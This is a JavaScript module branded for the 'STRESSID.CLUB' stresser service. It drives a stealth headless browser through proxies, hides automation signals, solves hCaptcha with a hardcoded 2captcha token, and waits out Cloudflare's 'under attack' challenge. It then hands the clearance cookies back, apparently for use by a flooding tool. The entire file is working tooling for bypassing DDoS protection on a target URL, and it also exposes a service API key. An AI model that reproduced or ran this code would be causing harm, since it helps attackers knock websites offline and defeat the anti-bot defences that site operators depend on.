require('events').EventEmitter.defaultMaxListeners = 0;
const puppeteer = require('puppeteer-extra')
const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');


function solving(message) {
    return new Promise((resolve, reject) => {
		
		console.log(`[STRESSID.CLUB] Proxy ${message.proxy}`) 
        console.log(`[STRESSID.CLUB] Launch browser...`)
        console.log(`[STRESSID.CLUB] Target: ${message.url}`)		
		
        puppeteer.use(StealthPlugin())
        puppeteer.use(RecaptchaPlugin({
            provider: {
                id: '2captcha',
                token: '484f6867edd89ad23af2d4cdfae8cbf5'
            },
            visualFeedback: true
        }))
        puppeteer.launch({
            headless: true,
            ignoreHTTPSErrors: true,
            ignoreDefaultArgs: [
                "--disable-extensions",
                "--enable-automation"
            ],
            args: [
                `--proxy-server=http://${message.proxy}`,
                '--disable-features=IsolateOrigins,site-per-process,SitePerProcess',
                '--flag-switches-begin --disable-site-isolation-trials --flag-switches-end',
                `--window-size=1920,1080`,
                "--window-position=000,000",
                "--disable-dev-shm-usage",
				'--user-agent=' + message.user_agent,
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--no-first-run',
                '--no-zygote',
                '--disable-gpu',
                '--hide-scrollbars',
                '--mute-audio',
                '--disable-gl-drawing-for-tests',
                '--disable-canvas-aa',
                '--disable-2d-canvas-clip-aa',
                '--disable-web-security',
                '--ignore-certificate-errors',
                '--ignore-certificate-errors-spki-list',
                '--disable-features=IsolateOrigins,site-per-process',
            ]
        }).then(async (browser) => {

            try {
                const page = await browser.newPage()
                await page.setJavaScriptEnabled(true);
                await page.setDefaultNavigationTimeout(0);
                await page.evaluateOnNewDocument(() => {
                    Object.defineProperty(navigator, 'webdriver', {
                        get: () => false
                    });
                })
                await page.evaluateOnNewDocument(() => {
                    Object.defineProperty(navigator, 'platform', {
                        get: () => 'Win32'
                    });
                })
                try {
                    const headeri = await page.on('request', req => {
                        const headers = req.headers();
                        headers['Host'] = `${message.fixhost}`;
                        headers['Upgrade-Insecure-Requests'] = '1';
                        headers['Sec-Fetch-Site'] = 'same-origin';
                        headers['Sec-Fetch-User'] = '?1';
                        headers['Sec-Fetch-Mode'] = 'navigate';
                        headers['Sec-Fetch-Dest'] = 'document';
                        headers['Sec-Ch-Ua-Platform'] = '"Windows"';
                        headers['Sec-Ch-Ua-Mobile'] = '?0';
                        headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
                        headers['Accept-Language'] = 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7';
                        headers['Accept-Encoding'] = 'gzip, deflate, br';
                        headers['Sec-GPC'] = '1';
                        headers['Upgrade-Insecure-Requests'] = '1';
                        headers['Cache-Control'] = 'no-cache';
                        headers['Pragma'] = 'no-cache';
                    });
                    var admv = await page.goto(message.url)
					page.on('dialog', async dialog => {
						await dialog.accept();
					});					
                } catch (error) {
                    await browser.close();
                }
                try {
					console.log(`[STRESSID.CLUB] 15 secound`)	
					await page.waitForTimeout(15000, { waitUntil:'networkidle0' })
					const maybeuam = await page.$('#cf-wrapper');
					const maybecaptchav1 = await page.$('#h-captcha');
					const maybecaptchav2 = await page.$('#cf-hcaptcha-container');
					if (maybeuam)
					{
						await page.waitForNavigation();
						await page.waitForTimeout(8000);	
						console.log(`[STRESSID.CLUB] Selector: found, 8 secound`)							
					}					
					if (maybecaptchav1)
					{
						console.log(`[STRESSID.CLUB] Found captcha, bypassing... | [v1]`)
						await page.waitForSelector('#h-captcha');
						await page.solveRecaptchas()
						try {
							console.log(`[STRESSID.CLUB] Try bypass captcha... | [v1]`)	
							await page.waitForNavigation({
								waitUntil: 'domcontentloaded',
								timeout: 15000
							});
						} catch (eds) {
							console.log(`[STRESSID.CLUB] No bypass captcha [v1]`)
							reject(eds)
							await browser.close();
						}						
					}
					else if (maybecaptchav2)
					{
						console.log(`[STRESSID.CLUB] Found captcha, bypassing... | [v2]`)
						await page.waitForSelector('#cf-hcaptcha-container');
						await page.solveRecaptchas()
						try {
							console.log(`[STRESSID.CLUB] Try bypass captcha... | [v2]`)	
							await page.waitForNavigation({
								waitUntil: 'domcontentloaded',
								timeout: 15000
							});
						} catch (abs) {
							console.log(`[STRESSID.CLUB] No bypass captcha [v2]`)
							reject(abs)
							await browser.close();
						}								
					}
					
					const checkcf = await page.$('#challenge-running.h2'); 
					if (checkcf) {
						await page.waitForTimeout(8000);
						console.log(`[STRESSID.CLUB] 8 secound [bypass cloudflare uam]`)	
					}						
					
					const pagestitle = (await page.title()).toString().trim();
                    const cookies = await page.cookies()
                    if (cookies) {					
                        resolve(cookies);
                        resolve();
						console.log('[STRESSID.CLUB] Title: ' + pagestitle + ' ');
                        await browser.close();
                        return;
                    }
                } catch (ee) {
                    reject(ee)
                    await browser.close();
                }

            } catch (e) {
                // handle initialization error
            }

        })
    })
}

module.exports = {
    solving: solving
}